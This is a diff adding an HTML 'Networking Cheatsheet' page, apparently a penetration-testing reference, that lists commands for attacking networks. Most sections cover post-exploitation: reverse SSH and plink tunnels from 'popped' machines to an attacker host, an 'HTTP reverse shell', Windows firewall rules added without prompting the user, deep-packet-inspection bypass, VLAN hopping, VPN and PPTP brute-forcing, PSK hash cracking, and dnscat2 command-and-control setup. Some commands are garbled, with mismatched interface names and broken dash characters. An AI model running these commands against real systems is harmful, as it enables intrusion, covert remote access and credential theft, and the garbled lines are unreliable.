@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Networking Cheatsheet - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Networking Cheatsheet", url: "#_top", children: [
+          ]},
+          {title: "Install bridge-utils", url: "#install-bridge-utils", children: [
+          ]},
+          {title: "Disable network-manager + firewall", url: "#disable-network-manager-firewall", children: [
+          ]},
+          {title: "Configuration", url: "#configuration", children: [
+          ]},
+          {title: "adding routes", url: "#adding-routes", children: [
+          ]},
+          {title: "Port Forwarding - accept traffic on a given IP address and port andredirect it to a different IP address and port", url: "#port-forwarding-accept-traffic-on-a-given-ip-address-and-port-andredirect-it-to-a-different-ip-address-and-port", children: [
+          ]},
+          {title: "SSH Local Port Forwarding: supports bi-directional communication channels", url: "#ssh-local-port-forwarding-supports-bi-directional-communication-channels", children: [
+          ]},
+          {title: "SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local", url: "#ssh-dynamic-port-forwarding-create-a-socks4-proxy-on-our-local", children: [
+          ]},
+          {title: "Proxychains - Perform nmap scan within a DMZ from an external computer", url: "#proxychains-perform-nmap-scan-within-a-dmz-from-an-external-computer", children: [
+          ]},
+          {title: "Create reverse SSH tunnel from Popped machine on :2222", url: "#create-reverse-ssh-tunnel-from-popped-machine-on-2222", children: [
+          ]},
+          {title: "Create a Dynamic application-level port forward on 8080 thru 2222", url: "#create-a-dynamic-application-level-port-forward-on-8080-thru-2222", children: [
+          ]},
+          {title: "Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains", url: "#leverage-the-ssh-socks-server-to-perform-nmap-scan-on-network-using-proxy-chains", children: [
+          ]},
+          {title: "HTTP Tunneling", url: "#http-tunneling", children: [
+          ]},
+          {title: "Traffic Encapsulation - Bypassing deep packet inspection", url: "#traffic-encapsulation-bypassing-deep-packet-inspection", children: [
+          ]},
+          {title: "Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network", url: "#tunnel-remote-desktop-rdp-from-a-popped-windows-machine-to-your-network", children: [
+          ]},
+          {title: "Port 22 blocked? Try port 80? or 443?", url: "#port-22-blocked-try-port-80-or-443", children: [
+          ]},
+          {title: "Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)", url: "#tunnel-remote-desktop-rdp-from-a-popped-windows-using-http-tunnel-bypass-deep-packet-inspection", children: [
+          ]},
+          {title: "Windows machine add required firewall rules without prompting the user", url: "#windows-machine-add-required-firewall-rules-without-prompting-the-user", children: [
+          ]},
+          {title: "Start the http tunnel client", url: "#start-the-http-tunnel-client", children: [
+          ]},
+          {title: "Create HTTP reverse shell by connecting to localhost port 3000", url: "#create-http-reverse-shell-by-connecting-to-localhost-port-3000", children: [
+          ]},
+          {title: "VLAN Hopping", url: "#vlan-hopping", children: [
+          ]},
+          {title: "VPN Hacking", url: "#vpn-hacking", children: [
+          ]},
+          {title: "Use IKEForce to enumerate or dictionary attack VPN servers:", url: "#use-ikeforce-to-enumerate-or-dictionary-attack-vpn-servers", children: [
+          ]},
+          {title: "Perform IKE VPN enumeration with IKEForce:", url: "#perform-ike-vpn-enumeration-with-ikeforce", children: [
+              {title: "Bruteforce IKE VPN using IKEForce:", url: "#bruteforce-ike-vpn-using-ikeforce" },
+          ]},
+          {title: "PPTP Hacking Identifying PPTP, it listens on TCP: 1723", url: "#pptp-hacking-identifying-pptp-it-listens-on-tcp-1723", children: [
+          ]},
+          {title: "SSH Pivoting - SSH pivoting from one network to another:", url: "#ssh-pivoting-ssh-pivoting-from-one-network-to-another", children: [
+          ]},
+          {title: "Attacking Machine Installation:", url: "#attacking-machine-installation", children: [
+          ]},
+          {title: "Run dnscat2:", url: "#run-dnscat2", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="networking-cheatsheet">Networking Cheatsheet</h1>
+<hr />
+<p>[+] Setting up an Ethernet bridge in Ubuntu/Kali Linux</p>
+<h1 id="install-bridge-utils">Install bridge-utils</h1>
+<p>sudo apt-get install bridge-utils</p>
+<h1 id="disable-network-manager-firewall">Disable network-manager + firewall</h1>
+<h1 id="configuration">Configuration</h1>
+<p>ifconfig
+ifconfig eth0 0.0.0.0
+ifconfig eth1 0.0.0.0
+brctl addbr br0
+brctl addif br0 eth0
+brctl addif br0 eth1
+ifconfig mybridge up
+dhclient br0 on devices</p>
+<p>sudo tcpdump -i mybridge</p>
+<h1 id="adding-routes">adding routes</h1>
+<p>route add 192.168.1.0/24 gw 10.10.0.43</p>
+<h1 id="port-forwarding-accept-traffic-on-a-given-ip-address-and-port-andredirect-it-to-a-different-ip-address-and-port">Port Forwarding - accept traffic on a given IP address and port andredirect it to a different IP address and port</h1>
+<p>apt-get install rinetd
+cat /etc/rinetd.conf<br />
+# bindadress bindport connectaddress connectport 
+w.x.y.z 53 a.b.c.d 80</p>
+<h1 id="ssh-local-port-forwarding-supports-bi-directional-communication-channels">SSH Local Port Forwarding: supports bi-directional communication channels</h1>
+<p>ssh <gateway> -L <local port to listen>:<remotehost>:<remote port></p>
+<h1 id="ssh-dynamic-port-forwarding-create-a-socks4-proxy-on-our-local">SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local</h1>
+<p>attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
+network on ANY PORT
+ssh -D <local proxy port> -p <remote port><target></p>
+<h1 id="proxychains-perform-nmap-scan-within-a-dmz-from-an-external-computer">Proxychains - Perform nmap scan within a DMZ from an external computer</h1>
+<h1 id="create-reverse-ssh-tunnel-from-popped-machine-on-2222">Create reverse SSH tunnel from Popped machine on :2222</h1>
+<p>ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com
+ssh -f -N -R 2222:<local host>:22 root@<remote host></p>
+<h1 id="create-a-dynamic-application-level-port-forward-on-8080-thru-2222">Create a Dynamic application-level port forward on 8080 thru 2222</h1>
+<p>ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host></p>
+<h1 id="leverage-the-ssh-socks-server-to-perform-nmap-scan-on-network-using-proxy-chains">Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains</h1>
+<p>proxychains nmap --top-ports=20 -sT -Pn $ip/24</p>
+<h1 id="http-tunneling">HTTP Tunneling</h1>
+<p>nc -vvn $ip 8888</p>
+<h1 id="traffic-encapsulation-bypassing-deep-packet-inspection">Traffic Encapsulation - Bypassing deep packet inspection</h1>
+<p>http tunnel
+On server side:
+sudo hts -F <server ip addr>:<port of your app> 80<br />
+On client side:
+sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel</p>
+<h1 id="tunnel-remote-desktop-rdp-from-a-popped-windows-machine-to-your-network">Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network</h1>
+<p>Tunnel on port 22
+plink -l root -pw pass -R 3389:<localhost>:3389 <remote host></p>
+<h1 id="port-22-blocked-try-port-80-or-443">Port 22 blocked? Try port 80? or 443?</h1>
+<p>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80</p>
+<h1 id="tunnel-remote-desktop-rdp-from-a-popped-windows-using-http-tunnel-bypass-deep-packet-inspection">Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)</h1>
+<h1 id="windows-machine-add-required-firewall-rules-without-prompting-the-user">Windows machine add required firewall rules without prompting the user</h1>
+<p>netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes
+netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000
+netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080
+netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079</p>
+<h1 id="start-the-http-tunnel-client">Start the http tunnel client</h1>
+<p>httptunnel_client.exe</p>
+<h1 id="create-http-reverse-shell-by-connecting-to-localhost-port-3000">Create HTTP reverse shell by connecting to localhost port 3000</h1>
+<p>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000</p>
+<h1 id="vlan-hopping">VLAN Hopping</h1>
+<p>git clone https://github.com/nccgroup/vlan-hopping.git
+chmod 700 frogger.sh
+./frogger.sh`</p>
+<h1 id="vpn-hacking">VPN Hacking</h1>
+<ul>
+<li>
+<p>Identify VPN servers:
+./udp-protocol-scanner.pl -p ike $ip</p>
+</li>
+<li>
+<p>Scan a range for VPN servers:
+./udp-protocol-scanner.pl -p ike -f ip.txt</p>
+</li>
+</ul>
+<h1 id="use-ikeforce-to-enumerate-or-dictionary-attack-vpn-servers">Use IKEForce to enumerate or dictionary attack VPN servers:</h1>
+<p>pip install pyip
+git clone https://github.com/SpiderLabs/ikeforce.git  </p>
+<h1 id="perform-ike-vpn-enumeration-with-ikeforce">Perform IKE VPN enumeration with IKEForce:</h1>
+<p>./ikeforce.py TARGET-IP â€“e â€“w wordlists/groupnames.dic  </p>
+<h3 id="bruteforce-ike-vpn-using-ikeforce">Bruteforce IKE VPN using IKEForce:</h3>
+<p>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  </p>
+<p>Use ike-scan to capture the PSK hash:
+ike-scan
+ike-scan TARGET-IP
+ike-scan -A TARGET-IP
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
+ike-scan â€“M â€“A â€“n example_group -P hash-file.txt TARGET-IP  </p>
+<p>Use psk-crack to crack the PSK hash</p>
+<p>psk-crack hash-file.txt
+pskcrack
+psk-crack -b 5 TARGET-IPkey
+psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+psk-crack -d /path/to/dictionary-file TARGET-IP-key</p>
+<h1 id="pptp-hacking-identifying-pptp-it-listens-on-tcp-1723">PPTP Hacking Identifying PPTP, it listens on TCP: 1723</h1>
+<p>NMAP PPTP Fingerprint:</p>
+<p>nmap â€“Pn -sV -p 1723 TARGET(S)<br />
+PPTP Dictionary Attack</p>
+<p>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</p>
+<h1 id="ssh-pivoting-ssh-pivoting-from-one-network-to-another">SSH Pivoting - SSH pivoting from one network to another:</h1>
+<p>ssh -D <local host>:1010 -p 22 user@<remote host></p>
+<h1 id="attacking-machine-installation">Attacking Machine Installation:</h1>
+<p>apt-get update
+apt-get -y install ruby-dev git make g++
+gem install bundler
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+bundle install</p>
+<h1 id="run-dnscat2">Run dnscat2:</h1>
+<p>ruby ./dnscat2.rb
+dnscat2&gt; New session established: 1422
+dnscat2&gt; session -i 1422</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/networking.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
